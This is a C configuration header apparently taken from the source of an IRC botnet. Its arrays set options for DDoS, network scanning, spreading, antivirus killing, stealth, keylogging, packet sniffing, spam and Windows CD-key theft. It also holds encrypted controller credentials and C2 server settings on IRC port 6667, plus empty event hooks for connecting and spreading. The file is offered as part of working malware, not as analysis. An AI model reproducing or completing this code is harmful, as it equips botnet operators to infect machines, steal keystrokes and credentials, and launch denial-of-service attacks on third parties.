#ifndef __CONFIG_H__
#define __CONFIG_H__

#include "confbase.h"

// The section name for polymorph
#define SECTION_NAME ".cjziozg"

// Array of CVars
conf_cvar g_aCVars[] = {
	{	"bot_filename",	"",	"628k40Z3806pf2b5",	"\xD4\x1D\x8C\xD9\x8F\x00\xB2\x04\xE9\x80\x09\x98\xEC\xF8\x42\x7E"	},
	{	"bot_id",	"",	"pNQ58qkk1gr444zz",	"\xD4\x1D\x8C\xD9\x8F\x00\xB2\x04\xE9\x80\x09\x98\xEC\xF8\x42\x7E"	},
	{	"bot_prefix",	"",	NULL,	""	},
	{	"bot_timeout",	"0",	NULL,	""	},
	{	"bot_seclogin",	"false",	NULL,	""	},
	{	"bot_compnick",	"false",	NULL,	""	},
	{	"bot_randnick",	"false",	NULL,	""	},
	{	"bot_meltserver",	"false",	NULL,	""	},
	{	"bot_topiccmd",	"false",	NULL,	""	},
	{	"do_speedtest",	"false",	NULL,	""	},
	{	"do_avkill",	"false",	NULL,	""	},
	{	"do_stealth",	"false",	NULL,	""	},
	{	"as_valname",	"",	"3a0ZJ0U95x6H7I9U",	"\xD4\x1D\x8C\xD9\x8F\x00\xB2\x04\xE9\x80\x09\x98\xEC\xF8\x42\x7E"	},
	{	"as_enabled",	"false",	NULL,	""	},
	{	"as_service",	"false",	NULL,	""	},
	{	"as_service_name",	"",	"7Igkil9jWJHzZE77",	"\xD4\x1D\x8C\xD9\x8F\x00\xB2\x04\xE9\x80\x09\x98\xEC\xF8\x42\x7E"	},
	{	"scan_maxthreads",	"0",	NULL,	""	},
	{	"scan_maxsockets",	"0",	NULL,	""	},
	{	"ddos_maxthreads",	"0",	NULL,	""	},
	{	"redir_maxthreads",	"0",	NULL,	""	},
	{	"identd_enabled",	"false",	NULL,	""	},
	{	"cdkey_windows",	"false",	NULL,	""	},
	{	"scaninfo_level",	"0",	NULL,	""	},
	{	"spam_aol_channel",	"",	"WT3S3etwQwe4oW0V",	"\xD4\x1D\x8C\xD9\x8F\x00\xB2\x04\xE9\x80\x09\x98\xEC\xF8\x42\x7E"	},
	{	"spam_aol_enabled",	"false",	NULL,	""	},
	{	"sniffer_enabled",	"false",	NULL,	""	},
	{	"sniffer_channel",	"",	"kFOB5Q7961VwF9pA",	"\xD4\x1D\x8C\xD9\x8F\x00\xB2\x04\xE9\x80\x09\x98\xEC\xF8\x42\x7E"	},
	{	"keylog_enabled",	"false",	NULL,	""	},
	{	"keylog_channel",	"",	"33SOL6ogbQq5FSuN",	"\xD4\x1D\x8C\xD9\x8F\x00\xB2\x04\xE9\x80\x09\x98\xEC\xF8\x42\x7E"	},
	{	"scaninfo_chan",	"",	"0jTrwur5OKZ8cZBu",	"\xD4\x1D\x8C\xD9\x8F\x00\xB2\x04\xE9\x80\x09\x98\xEC\xF8\x42\x7E"	},
	{	"inst_polymorph",	"false",	NULL,	""	},
	{	"vuln_channel",	"",	"5238dg4U1gboWivh",	"\xD4\x1D\x8C\xD9\x8F\x00\xB2\x04\xE9\x80\x09\x98\xEC\xF8\x42\x7E"	},
};

// Array of Users
conf_user g_aUsers[] = {
{	{	"user0.username",	"\xBA\x0C\x69\x53\xEB",	"UoKxZxDDgN0298G6",	"\x79\x1A\x8F\x80\x2F\xA9\x20\xA0\xDE\x62\x84\xCC\x23\x01\x4C\xF5"	},
	{	"user0.password",	"2C875F213F85F4E76C8B8E3D01D58BAA",	NULL,	"\x39\x5B\x22\x98\x65\x29\xF1\x53\xB9\xE7\x12\x60\xE9\x14\x6E\xF2"	},
	{	"user0.hostmask",	"\xD1",	"UoKxZxDDgN0298G6",	"\xAD\x1E\x54\x95\x49\x4F\x17\x68\x00\x3E\x1D\x19\xEE\xD9\xD7\xF5"	},
	{	"user0.identdmask",	"\xBA\x06\x8C\xCD\xB9\x01\x11",	"UoKxZxDDgN0298G6",	"\x76\x9F\xC7\x22\x1D\x70\x79\xBE\x9E\x78\xDB\x10\xD2\xA9\xB0\x49"	}, },
};

// Array of Servers
conf_server g_aServers[] = {
{	{	"server0.chanpass",	"\x02\xA1\x14\xD1",	"p5H543a77iz0gPnw",	"\xC4\x55\x3C\x33\x09\xFC\x2A\x80\xF2\x91\x69\x2B\x53\xE0\x7B\x4B"	},
	{	"server0.mainchan",	"\x51\x72\xAC\xEA\x7A\x4E\xB9\x3F\x41",	"p5H543a77iz0gPnw",	"\x0C\x7B\xB2\xB6\xAB\x38\xA4\xA2\x85\xA9\x60\xC5\x54\x47\xE2\x64"	},
	{	"server0.nickprefix",	"\x29\xC4\x5E\xF6",	"p5H543a77iz0gPnw",	"\x8F\x24\xFF\x0D\xCD\xFF\x73\xCA\xA8\xF0\xA0\x77\x4D\x4A\x20\x27"	},
	{	"server0.port",	"6667",	NULL,	""	},
	{	"server0.server",	"\x1A\x75\x05\xBA\x9C\xC0\xF2\x8E\x79\x4D\x8D\xFD\x5E\xA0\x08\x90",	"p5H543a77iz0gPnw",	"\x04\xB5\x31\x61\x47\x42\x36\x2D\x86\x28\x32\xF0\xB7\xB1\x7F\x4C"	},
	{	"server0.servpass",	"",	"p5H543a77iz0gPnw",	"\xD4\x1D\x8C\xD9\x8F\x00\xB2\x04\xE9\x80\x09\x98\xEC\xF8\x42\x7E"	},
	{	"server0.usessl",	"false",	NULL,	""	}	},
};

// Script

char *g_szScript = \
	"onstart {\n" \
	"}\n" \
	"onconnect {\n" \
	"}\n" \
	"onjoin {\n" \
	"}\n" \
	"onlogin {\n" \
	"}\n" \
	"ondisconnect {\n" \
	"}\n" \
	"onremove {\n" \
	"}\n" \
	"onspread {\n" \
	"}\n" \
	"ondebugeractive {\n" \
	"}\n" \
	"ontimer 10080m {\n" \
	"}\n" \
	"onstartupfin {\n" \
	"}\n";

#endif // __CONFIG_H__
